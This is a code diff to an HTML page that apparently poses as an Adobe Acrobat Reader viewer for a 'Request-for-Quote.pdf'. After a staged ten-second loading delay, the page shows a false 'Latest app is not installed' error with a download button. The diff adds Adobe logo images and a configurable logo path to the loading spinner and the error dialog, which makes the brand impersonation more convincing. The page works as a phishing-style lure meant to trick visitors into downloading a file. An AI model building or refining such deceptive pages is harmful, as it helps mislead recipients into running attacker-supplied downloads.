@@ -319,6 +319,15 @@
         margin-bottom: 0;
       }
 
+      .brand-logo {
+        display: block;
+        width: 3.6rem;
+        height: 3.6rem;
+        object-fit: contain;
+        border-radius: 0.85rem;
+        box-shadow: 0 0.75rem 1.6rem rgba(0, 0, 0, 0.12);
+      }
+
       .viewer-loading h1 {
         margin: 0;
         font-size: 1.12rem;
@@ -345,6 +354,12 @@
         margin: 0 0 0.65rem;
         font-size: 1.05rem;
         letter-spacing: -0.01em;
+      }
+
+      .error-dialog .brand-logo {
+        width: 3rem;
+        height: 3rem;
+        margin-bottom: 0.9rem;
       }
 
       .error-dialog p {
@@ -505,13 +520,34 @@
 
       .spinner {
         flex: 0 0 auto;
-        width: 3rem;
-        height: 3rem;
-        border: 0.35rem solid #f4c6c6;
-        border-top-color: var(--adobe-red);
+        position: relative;
+        display: grid;
+        width: 4.4rem;
+        height: 4.4rem;
+        place-items: center;
+        background: rgba(255, 255, 255, 0.82);
+        border: 0;
         border-radius: 50%;
         box-shadow: 0 0 0 0.45rem rgba(237, 34, 36, 0.08);
+      }
+
+      .spinner::before {
+        position: absolute;
+        inset: 0;
+        content: "";
+        border: 0.35rem solid #f4c6c6;
+        border-top-color: var(--adobe-red);
+        border-radius: inherit;
         animation: spin 0.65s linear infinite;
+      }
+
+      .spinner-logo {
+        position: relative;
+        z-index: 1;
+        width: 2.35rem;
+        height: 2.35rem;
+        object-fit: contain;
+        border-radius: 0.55rem;
       }
 
       .loading-dots::after {
@@ -850,7 +886,10 @@
       </div>
 
       <div id="viewer-loading" class="viewer-loading" role="status" aria-live="polite">
-        <div class="spinner" aria-hidden="true"></div>
+        <img id="loading-logo" class="brand-logo" src="./adobe-logo.svg" alt="Adobe Acrobat Reader">
+        <div class="spinner" aria-hidden="true">
+          <img id="spinner-logo" class="spinner-logo" src="./adobe-logo.svg" alt="">
+        </div>
         <p class="viewer-company">Adobe Acrobat Reader</p>
         <h1>Opening <span id="opening-file-name">Request-for-Quote.pdf</span><span class="loading-dots" aria-hidden="true"></span></h1>
         <p>Rendering document preview</p>
@@ -865,6 +904,7 @@
         aria-labelledby="error-title"
         hidden
       >
+        <img id="dialog-logo" class="brand-logo" src="./adobe-logo.svg" alt="Adobe Acrobat Reader">
         <h2 id="error-title">Latest app is not installed</h2>
         <p>To view this document,<br>you need the latest Adobe app.</p>
         <div class="dialog-actions">
@@ -889,6 +929,7 @@
       {
         "companyName": "Renovation Sells. RFQ",
         "documentName": "Request-for-Quote.pdf",
+        "logoPath": "./adobe-logo.svg",
         "downloadFileName": "rfq.pdf",
         "downloadPath": "./rfq.pdf",
         "loadingDelayMs": 10000
@@ -901,6 +942,7 @@
       const errorDialog = document.querySelector("#error-dialog");
       const rfqCompanyName = document.querySelector("#rfq-company-name");
       const openingFileName = document.querySelector("#opening-file-name");
+      const logoImages = document.querySelectorAll("[data-logo], #loading-logo, #spinner-logo, #dialog-logo");
       const downloadButton = document.querySelector("#download-button");
       const downloadStatus = document.querySelector("#download-status");
       const cancelButton = document.querySelector("#cancel-button");
@@ -908,6 +950,7 @@
       const config = JSON.parse(configElement.textContent);
       const configuredCompanyName = config.companyName || "Renovation Sells. RFQ";
       const configuredDocumentName = config.documentName || "Request-for-Quote.pdf";
+      const configuredLogoPath = config.logoPath || "./adobe-logo.svg";
       const configuredDownloadFileName = config.downloadFileName || "rfq.pdf";
       const configuredDownloadPath = config.downloadPath || `./${configuredDownloadFileName}`;
       const safeDownloadFileName = configuredDownloadFileName.toLowerCase().endsWith(".pdf")
@@ -921,6 +964,12 @@
 
       rfqCompanyName.textContent = configuredCompanyName;
       openingFileName.textContent = configuredDocumentName;
+      logoImages.forEach((logoImage) => {
+        logoImage.src = configuredLogoPath;
+        logoImage.addEventListener("error", () => {
+          logoImage.hidden = true;
+        });
+      });
 
       cancelButton.addEventListener("click", () => {
         errorDialog.hidden = true;
